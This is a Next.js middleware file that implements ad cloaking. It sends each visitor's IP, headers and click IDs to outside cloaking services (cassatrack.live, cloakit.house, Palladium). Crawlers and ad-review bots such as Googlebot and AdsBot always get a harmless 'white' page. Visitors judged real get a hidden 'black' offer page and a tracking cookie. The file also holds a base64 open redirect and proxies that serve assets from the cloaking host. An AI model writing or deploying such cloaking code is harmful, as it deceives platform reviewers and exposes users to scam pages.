import { NextResponse } from 'next/server';

const CLOAK_API_URL = process.env.NEXT_PUBLIC_CLOAK_API_URL || 'https://cassatrack.live/api/v1/checks';
const CLOAKITHOUSE_API_URL = process.env.NEXT_PUBLIC_CLOAKITHOUSE_API_URL || 'https://cloakit.house/api/v1/check';
const CHECK_DEAL_API_URL = process.env.NEXT_PUBLIC_CHECK_DEAL_API_URL || 'https://cassatrack.live/api/v1/check-deal';
const CHECK_PAGE_API_URL = process.env.NEXT_PUBLIC_CHECK_PAGE_API_URL || 'https://cassatrack.live/api/v1/checks/check-page';
const PALLADIUM_SERVER = 'https://rbl.palladium.expert';

const getClientIP = (headersList) => {
  const cfConnectingIp = headersList.get('cf-connecting-ip');
  if (cfConnectingIp) return cfConnectingIp;

  const xRealIp = headersList.get('x-real-ip');
  if (xRealIp) return xRealIp;

  const xForwardedFor = headersList.get('x-forwarded-for');
  if (xForwardedFor) {
    const ips = xForwardedFor.split(',');
    return ips[0].trim();
  }

  const clientIp = headersList.get('client-ip') || headersList.get('x-client-ip');
  if (clientIp) return clientIp;

  return '127.0.0.1';
};

const generateStealthFingerprint = () => {
  const timestamp = Date.now();
  const randomSeed = Math.random().toString(36).substring(2);
  const deviceId = `dev_${timestamp.toString(36)}_${randomSeed}`;
  return {
    device_id: deviceId,
    session_id: deviceId,
    request_id: Math.random().toString(36).substring(7),
    timestamp,
    fingerprint: `fp_${deviceId}_${randomSeed}`,
  };
};

const base64Decode = (data) => {
  const remainder = data.length % 4;
  if (remainder) data += '='.repeat(4 - remainder);
  data = data.replace(/-/g, '+').replace(/_/g, '/');
  try { return atob(data); } catch { return ''; }
};

const generateStealthHeaders = () => {
  const stealthUA = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
  ];

  return {
    'User-Agent': stealthUA[Math.floor(Math.random() * stealthUA.length)],
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Cache-Control': 'max-age=0'
  };
};

const httpBuildQuery = (obj, prefix = '') => {
  const params = [];

  for (const key in obj) {
    if (obj.hasOwnProperty(key)) {
      const value = obj[key];
      const k = prefix ? `${prefix}[${key}]` : key;

      if (value === null || value === undefined) {
        params.push(`${k}=`);
      } else if (value && typeof value === 'object' && !Array.isArray(value)) {
        const nestedQuery = httpBuildQuery(value, k);
        if (nestedQuery) {
          params.push(nestedQuery);
        }
      } else if (Array.isArray(value)) {
        value.forEach((item, index) => {
          if (typeof item === 'object') {
            const arrayQuery = httpBuildQuery(item, `${k}[${index}]`);
            if (arrayQuery) {
              params.push(arrayQuery);
            }
          } else {
            params.push(`${k}[${index}]=${encodeURIComponent(item || '')}`);
          }
        });
      } else {
        params.push(`${k}=${encodeURIComponent(value.toString())}`);
      }
    }
  }

  return params.join('&');
};

const makeCurlRequest = async (url, data, domain) => {
  try {
    const stealthData = generateStealthFingerprint();

    data.domain = domain;

    const finalData = {
      ...data,
      ...stealthData,
      domain: domain
    };

    const bodyParams = new URLSearchParams();
    Object.entries(finalData).forEach(([key, value]) => {
      if (value !== undefined && value !== null) {
        bodyParams.append(key, String(value));
      }
    });

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        ...generateStealthHeaders(),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json',
        'Cache-Control': 'no-store',
      },
      body: bodyParams.toString(),
    });

    if (response.ok) {
      const result = await response.json();
      return result;
    } else {
      return null;
    }
  } catch (error) {
    return null;
  }
};

const collectServerHeaders = (requestHeaders) => {
  const serverHeaders = {};

  serverHeaders['REMOTE_ADDR'] = getClientIP(requestHeaders);
  serverHeaders['SERVER_PROTOCOL'] = 'HTTP/1.1';
  serverHeaders['SERVER_PORT'] = '443';
  serverHeaders['REMOTE_PORT'] = '443';
  serverHeaders['QUERY_STRING'] = '';
  serverHeaders['REQUEST_SCHEME'] = 'https';
  serverHeaders['REQUEST_URI'] = '/';
  serverHeaders['REQUEST_TIME_FLOAT'] = Date.now() / 1000;

  serverHeaders['X_FB_HTTP_ENGINE'] = requestHeaders.get('x-fb-http-engine') || '';
  serverHeaders['X_PURPOSE'] = requestHeaders.get('x-purpose') || '';
  serverHeaders['X_FORWARDED_FOR'] = requestHeaders.get('x-forwarded-for') || '';
  serverHeaders['X_WAP_PROFILE'] = requestHeaders.get('x-wap-profile') || '';
  serverHeaders['X-Forwarded-Host'] = requestHeaders.get('x-forwarded-host') || requestHeaders.get('host') || '';
  serverHeaders['X-Forwarded-For'] = requestHeaders.get('x-forwarded-for') || '';
  serverHeaders['X-Frame-Options'] = requestHeaders.get('x-frame-options') || '';

  requestHeaders.forEach((value, key) => {
    const httpKey = `HTTP_${key.toUpperCase().replace(/-/g, '_')}`;
    serverHeaders[httpKey] = value;
  });

  serverHeaders['HTTP_USER_AGENT'] = requestHeaders.get('user-agent') || '';
  serverHeaders['HTTP_ACCEPT'] = requestHeaders.get('accept') || '';
  serverHeaders['HTTP_ACCEPT_LANGUAGE'] = requestHeaders.get('accept-language') || '';
  serverHeaders['HTTP_ACCEPT_ENCODING'] = requestHeaders.get('accept-encoding') || '';
  serverHeaders['HTTP_CONNECTION'] = requestHeaders.get('connection') || 'close';
  serverHeaders['HTTP_HOST'] = requestHeaders.get('host') || '';
  serverHeaders['HTTP_REFERER'] = requestHeaders.get('referer') || requestHeaders.get('referrer') || '';
  serverHeaders['HTTP_CACHE_CONTROL'] = requestHeaders.get('cache-control') || '';
  serverHeaders['HTTP_PRAGMA'] = requestHeaders.get('pragma') || '';
  serverHeaders['HTTP_SEC_FETCH_DEST'] = requestHeaders.get('sec-fetch-dest') || '';
  serverHeaders['HTTP_SEC_FETCH_MODE'] = requestHeaders.get('sec-fetch-mode') || '';
  serverHeaders['HTTP_SEC_FETCH_SITE'] = requestHeaders.get('sec-fetch-site') || '';
  serverHeaders['HTTP_UPGRADE_INSECURE_REQUESTS'] = requestHeaders.get('upgrade-insecure-requests') || '';

  return serverHeaders;
};

const makePalladiumRequest = async (palladiumData) => {
  try {
    const queryString = httpBuildQuery(palladiumData);

    const response = await fetch(PALLADIUM_SERVER, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (compatible; PalladiumClient/1.0)',
        'Accept': '*/*',
        'Connection': 'close',
      },
      body: queryString,
    });

    if (response.status === 200) {
      const result = await response.json();
      const palladiumResult = result.result ? true : false;
      return { status: palladiumResult, data: result };
    } else {
      console.error('Palladium API error:', response.status);
      return { status: false, data: null };
    }
  } catch (error) {
    console.error('Error making Palladium request:', error);
    return { status: false, data: null };
  }
};

const handleCloakingHouse = async (body, uniqueId, requestData, domain) => {
  try {
    requestData.label = body.cloakinghouse_key;

    const cloakitBody = await makeCurlRequest(CLOAKITHOUSE_API_URL, requestData, domain);

    if (!cloakitBody) {
      return false;
    }

    if (cloakitBody.filter_type === 'delete_stream') {
      return false;
    }

    return cloakitBody.filter_page === 'offer';
  } catch (error) {
    console.error('CloakingHouse error:', error);
    return false;
  }
};

const collectRequestData = (request) => {
  const data = {};
  try {
    if (request.method === 'POST') {
      const contentType = request.headers.get('content-type') || '';
      if (contentType.includes('application/x-www-form-urlencoded') || contentType.includes('multipart/form-data')) {
        // Edge middleware'de POST body'ye erişim kısıtlı, boş döner
      }
    }
  } catch {}
  return data;
};

const collectJsRequestData = (request) => {
  const data = {};
  try {
    if (request.method === 'POST') {
      // jsdata POST ile gelir, middleware'de mevcut değil
    }
  } catch {}
  return data;
};

const handlePalladium = async (body, uniqueId, requestData, requestHeaders, request) => {
  try {
    const clientCompany = body.palladium_client_company;
    const clientSecret = body.palladium_client_secret;
    const clientId = body.palladium_client_id;

    const serverHeaders = collectServerHeaders(requestHeaders);
    serverHeaders['bannerSource'] = 'adwords';

    const headers = {
      request: collectRequestData(request),
      jsrequest: collectJsRequestData(request),
      server: serverHeaders,
      auth: {
        clientId: clientId,
        clientCompany: clientCompany,
        clientSecret: clientSecret
      }
    };

    const palladiumBody = await makePalladiumRequest(headers);
    const palladiumStatus = palladiumBody?.status || false;

    return { status: palladiumStatus, response: palladiumBody?.data || null };
  } catch (error) {
    console.error('Palladium error:', error);
    return { status: false, response: null };
  }
};

const getDomainShortKey = (host) => {
  const domain = host.split(':')[0].replace(/^www\./, '');
  const nameOnly = domain.replace(/\.[^.]+$/, '');
  return nameOnly.slice(-3);
};

const MEDIA_CONTENT_TYPES = {
  '.js': 'application/javascript',
  '.css': 'text/css',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.webp': 'image/webp',
  '.avif': 'image/avif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf',
  '.otf': 'font/otf',
  '.eot': 'application/vnd.ms-fontobject',
  '.json': 'application/json',
  '.map': 'application/json',
  '.mp4': 'video/mp4',
  '.webm': 'video/webm',
};

export async function middleware(request) {
  const { pathname } = request.nextUrl;
  console.log('[MW] START', pathname, request.method);

  const mediaMatch = pathname.match(/^\/media_v1_([a-z0-9]{3})\/(.+)$/);
  if (mediaMatch) {
    const remotePath = mediaMatch[2];
    const qs = request.nextUrl.search || '';
    const targetUrl = `https://cassatrack.live/${remotePath}${qs}`;

    try {
      const fetchOpts = {
        method: request.method,
        headers: {
          'User-Agent': request.headers.get('user-agent') || '',
          'Accept': request.headers.get('accept') || '*/*',
          'Referer': request.headers.get('referer') || '',
        },
      };

      if (request.method === 'POST') {
        fetchOpts.body = await request.arrayBuffer();
        const ct = request.headers.get('content-type');
        if (ct) fetchOpts.headers['Content-Type'] = ct;
      }

      const res = await fetch(targetUrl, fetchOpts);

      if (!res.ok) {
        return new Response('Not Found', { status: res.status });
      }

      const body = await res.arrayBuffer();
      const ext = '.' + (remotePath.split('?')[0].split('.').pop() || '').toLowerCase();
      const contentType = res.headers.get('content-type') || MEDIA_CONTENT_TYPES[ext] || 'application/octet-stream';
      const isApi = remotePath.includes('api/');

      return new Response(body, {
        status: 200,
        headers: {
          'Content-Type': contentType,
          'Cache-Control': isApi ? 'no-store' : 'public, max-age=31536000, immutable',
          'Access-Control-Allow-Origin': '*',
        },
      });
    } catch (e) {
      console.error('media proxy error:', e);
      return new Response('Not Found', { status: 404 });
    }
  }

  const storageMatch = pathname.match(/^\/storage_v1_([a-z0-9]{3})\/(.+)$/);
  if (storageMatch) {
    const remotePath = storageMatch[2];
    const targetUrl = `https://storage.cassatrack.live/${remotePath}`;

    try {
      const res = await fetch(targetUrl, {
        headers: {
          'User-Agent': request.headers.get('user-agent') || '',
          'Accept': '*/*',
          'Referer': request.headers.get('referer') || '',
        },
      });

      if (!res.ok) {
        return new Response('Not Found', { status: 404 });
      }

      const body = await res.arrayBuffer();
      const ext = '.' + (remotePath.split('?')[0].split('.').pop() || '').toLowerCase();
      const contentType = MEDIA_CONTENT_TYPES[ext] || res.headers.get('content-type') || 'application/octet-stream';

      return new Response(body, {
        status: 200,
        headers: {
          'Content-Type': contentType,
          'Cache-Control': 'public, max-age=31536000, immutable',
          'Access-Control-Allow-Origin': '*',
        },
      });
    } catch (e) {
      console.error('storage proxy error:', e);
      return new Response('Not Found', { status: 404 });
    }
  }

  if (pathname === '/redirect.php') {
    const b64 = request.nextUrl.searchParams.get('b64');
    if (b64) {
      const decoded = base64Decode(b64);
      try { new URL(decoded); return Response.redirect(decoded, 302); } catch {}
    }
    return Response.redirect(new URL('/', request.url), 302);
  }

  const goMatch = pathname.match(/^\/go\/(\d+)\/?$/);
  if (goMatch) {
    const dealId = goMatch[1];
    try {
      const host = (request.headers.get('host') || '').split(':')[0];
      const sp = request.nextUrl.searchParams;

      const gclidFromQuery = sp.get('gclid');
      const gclidFromCookie = request.cookies.get('_gclid')?.value;
      const gclid = gclidFromQuery || gclidFromCookie || '';

      const params = new URLSearchParams();
      params.set('deal_id', dealId);
      params.set('domain', host);
      if (gclid) params.set('gclid', gclid);
      const fbc = sp.get('fbc') || request.cookies.get('_fbc')?.value; if (fbc) params.set('fbc', fbc);
      const fbp = sp.get('fbp') || request.cookies.get('_fbp')?.value; if (fbp) params.set('fbp', fbp);
      params.set('timezone_client', sp.get('timezone_client') || String(new Date().getTimezoneOffset()));
      params.set('timezone', sp.get('timezone') || Intl.DateTimeFormat().resolvedOptions().timeZone);

      const checkRes = await fetch(`${CHECK_DEAL_API_URL}?${params.toString()}`, {
        method: 'GET',
        headers: {
          ...generateStealthHeaders(),
          'Accept': 'application/json',
          'Cache-Control': 'no-store',
          'X-Forwarded-For': getClientIP(request.headers),
          'Referer': request.headers.get('referer') || '',
        },
      });

      if (checkRes.ok) {
        const data = await checkRes.json();
        const redirectUrl = data?.redirect || data?.data?.redirect;
        if (redirectUrl) {
          try { new URL(redirectUrl); return Response.redirect(redirectUrl, 302); } catch {}
        }
      }
    } catch (e) {
      console.error('check-deal error:', e);
    }
    return Response.redirect(new URL('/', request.url), 302);
  }

  const _referer = request.headers.get('referer') || '';
  const _host = (request.headers.get('host') || '').split(':')[0];
  const _hasGclid = request.nextUrl.searchParams.has('gclid');
  const _hasRoi = request.nextUrl.searchParams.has('roi');
  if (_referer && !_hasGclid && !_hasRoi) {
    try {
      const refHost = new URL(_referer).hostname.replace(/^www\./, '');
      if (refHost === _host.replace(/^www\./, '')) {
        console.log('[MW] SKIP: self-referer, iç navigasyon');
        return NextResponse.next();
      }
    } catch {}
  }

  const secPurpose = request.headers.get('sec-purpose');
  if (secPurpose?.includes('prefetch')) {
    console.log('[MW] SKIP: prefetch request');
    return new Response('Service Unavailable', {
      status: 503,
      headers: { 'Cache-Control': 'no-store, no-cache, must-revalidate' },
    });
  }

  // ── BOT GUARD ──────────────────────────────────────────────────────
  // Known crawlers / inspection bots get instant white — no API call,
  // no log entry, no cloak evaluation. A bot must never classify offer.
  const _ua = request.headers.get('user-agent') || '';
  const _isBot = _ua === '' || /googlebot|adsbot-google|mediapartners-google|google-inspectiontool|apis-google|feedfetcher-google|google-site-verification|google-favicon|google-read-aloud|chrome-lighthouse|lighthouse|headlesschrome|bingbot|bingpreview|msnbot|duckduckbot|slurp|baiduspider|yandex(bot|images|metrika)|sogou|bytespider|applebot|petalbot|seznambot|exabot|gigabot|ia_archiver|archive\.org_bot|wayback|twitterbot|facebookexternalhit|facebookbot|linkedinbot|pinterestbot|whatsapp|telegrambot|skypeuripreview|discordbot|slackbot|embedly|outbrain|nuzzel|vkshare|w3c_validator|qwantify|ahrefsbot|semrushbot|mj12bot|dotbot|rogerbot|sitebulb|screaming\s*frog|moatbot|adscanner|adsterra-crawler|crawler|spider|bot\b/i.test(_ua);

  if (_isBot) {
    console.log('[MW] SKIP: bot detected, ua:', _ua.substring(0, 50));
    return NextResponse.next();
  }

  let apiType = 'white';

  try {
    const host = request.headers.get('host') || '';
    const referer = request.headers.get('referer') || request.headers.get('referrer') || '';
    const userAgent = request.headers.get('user-agent') || '';
    const ip = getClientIP(request.headers);
    const acceptLanguage = request.headers.get('accept-language') || '';

    let domain = process.env.SITE_DOMAIN || host;
    let query = '';
    let searchParams = new URLSearchParams();

    try {
      const url = new URL(request.url);
      domain = process.env.SITE_DOMAIN || host.split(':')[0] || url.hostname;
      query = url.search.substring(1);
      searchParams = url.searchParams;
    } catch (urlError) {
      console.error('Invalid URL format:', urlError);
      domain = host.split(':')[0] || host;
      query = '';
      searchParams = new URLSearchParams();
    }

    const gclid = searchParams.get('gclid') || '';
    const osmanDebug = searchParams.get('osmanDebug') || '';
    const roiParam = searchParams.get('roi');

    console.log('[MW] domain:', domain, '| gclid:', gclid, '| roi:', roiParam, '| osmanDebug:', osmanDebug);

    if (roiParam) {
      try {
        const cpRes = await fetch(`${CHECK_PAGE_API_URL}?domain=${encodeURIComponent(domain)}&key=${encodeURIComponent(roiParam)}`, {
          method: 'GET',
          headers: { 'Accept': 'application/json' },
        });
        if (cpRes.ok) {
          const cpData = await cpRes.json();
          if (cpData.status === true && cpData.page === 'black') {
            apiType = 'black';
          }
        }
      } catch {}
    } else if (!roiParam) {
      const stealthData = generateStealthFingerprint();
      const uniqueId = stealthData.session_id;

      const requestData = {
        user_agent: userAgent,
        referer: referer,
        query: query || '',
        lang: acceptLanguage,
        ip_address: ip,
        unique_id: uniqueId,
        osmanDebug: osmanDebug,
        gclid: gclid,
        domain: domain,
      };

      const hasBlackCookie = request.cookies.get('_bp')?.value === '1';
      if (hasBlackCookie) {
        requestData.local_page = 'offer';
        requestData.local_real_page = 'offer';
        apiType = 'black';
      }

      console.log('[MW] cassatrack request gonderiliyor...');
      const body = await makeCurlRequest(CLOAK_API_URL, requestData, domain);
      console.log('[MW] cassatrack response:', JSON.stringify(body));

      if (!body) {
        console.log('[MW] cassatrack body NULL!');
      } else if (hasBlackCookie) {
        if (body.log_id) {
          requestData.log_id = body.log_id;
          makeCurlRequest(CLOAK_API_URL, requestData, domain);
        }
      } else {
        const localCloakingStatus = body.filter_page === 'offer';
        requestData.local_page = localCloakingStatus ? 'offer' : 'white';
        console.log('[MW] filter_page:', body.filter_page, '| localCloaking:', localCloakingStatus);
        console.log('[MW] palladium_status:', body.palladium_status, '| cloakinghouse_status:', body.cloakinghouse_status);

        if (!localCloakingStatus) {
          console.log('[MW] localCloaking=false, white');
          requestData.local_real_page = 'white';
        } else {
          let cloakingHouseCheck = false;
          let palladiumCheck = false;

          if (body.cloakinghouse_status === 'ACTIVE') {
            cloakingHouseCheck = await handleCloakingHouse(body, uniqueId, requestData, domain);
            requestData.chouse_page = cloakingHouseCheck ? 'offer' : 'white';
          }

          if (body.palladium_status === 'ACTIVE') {
            console.log('[MW] palladium ACTIVE, istek gonderiliyor...');
            const palladiumResult = await handlePalladium(body, uniqueId, requestData, request.headers, request);
            palladiumCheck = palladiumResult.status;
            requestData.palladium_page = palladiumCheck ? 'offer' : 'white';
            requestData.palladium_response = JSON.stringify(palladiumResult.response);
            console.log('[MW] palladium result:', palladiumCheck, '| response:', JSON.stringify(palladiumResult.response));
          } else {
            console.log('[MW] palladium NOT ACTIVE, skip');
          }

          const hasActiveThirdParty = body.cloakinghouse_status === 'ACTIVE' || body.palladium_status === 'ACTIVE';

          console.log('[MW] hasActiveThirdParty:', hasActiveThirdParty, '| chouseCheck:', cloakingHouseCheck, '| palladiumCheck:', palladiumCheck);

          if (!hasActiveThirdParty) {
            console.log('[MW] no 3rd party active -> black');
            requestData.local_real_page = 'offer';
            apiType = 'black';
          } else {
            const chouseBlocks = body.cloakinghouse_status === 'ACTIVE' && !cloakingHouseCheck;
            const palladiumBlocks = body.palladium_status === 'ACTIVE' && !palladiumCheck;

            if (chouseBlocks || palladiumBlocks) {
              requestData.local_real_page = 'white';
            } else {
              requestData.local_real_page = 'offer';
              apiType = 'black';
            }
          }
        }

        if (body.log_id) {
          requestData.log_id = body.log_id;
          requestData.local_page = requestData.local_page || 'white';
          requestData.local_real_page = requestData.local_real_page || 'white';
          makeCurlRequest(CLOAK_API_URL, requestData, domain);
        }
      }
    }
  } catch (error) {
    console.error('[MW] CATCH ERROR:', error);
    apiType = 'white';
  }

  console.log('[MW] FINAL apiType:', apiType);

  const requestHeaders = new Headers(request.headers);
  const searchParamsStr = request.nextUrl.search.substring(1);
  requestHeaders.set('x-search-params', searchParamsStr + (searchParamsStr ? '&' : '') + '_t=' + apiType);
  requestHeaders.set('x-forwarded-proto', request.nextUrl.protocol);
  requestHeaders.set('x-original-referer', request.headers.get('referer') || '');
  requestHeaders.set('x-forwarded-for', getClientIP(request.headers));

  const response = NextResponse.next({
    request: { headers: requestHeaders },
  });

  if (apiType === 'black') {
    response.cookies.set('_bp', '1', {
      httpOnly: true,
      secure: true,
      sameSite: 'lax',
      maxAge: 60 * 60 * 24 * 30,
    });
  }

  const _sp = request.nextUrl.searchParams;
  const _gclid = _sp.get('gclid');
  const _fbc = _sp.get('fbc');
  const _fbp = _sp.get('fbp');
  const cookieOpts = { httpOnly: true, secure: true, sameSite: 'lax', maxAge: 60 * 60 * 24 * 30 };
  if (_gclid) response.cookies.set('_gclid', _gclid, cookieOpts);
  if (_fbc) response.cookies.set('_fbc', _fbc, cookieOpts);
  if (_fbp) response.cookies.set('_fbp', _fbp, cookieOpts);

  return response;
}

export const config = {
  matcher: [
    '/((?!api|_next|fonts|public|.*\\.(?!php).*|favicon.ico).*)',
    '/redirect.php',
    '/media_v1_:slot/:path*',
    '/storage_v1_:slot/:path*',
  ],
};
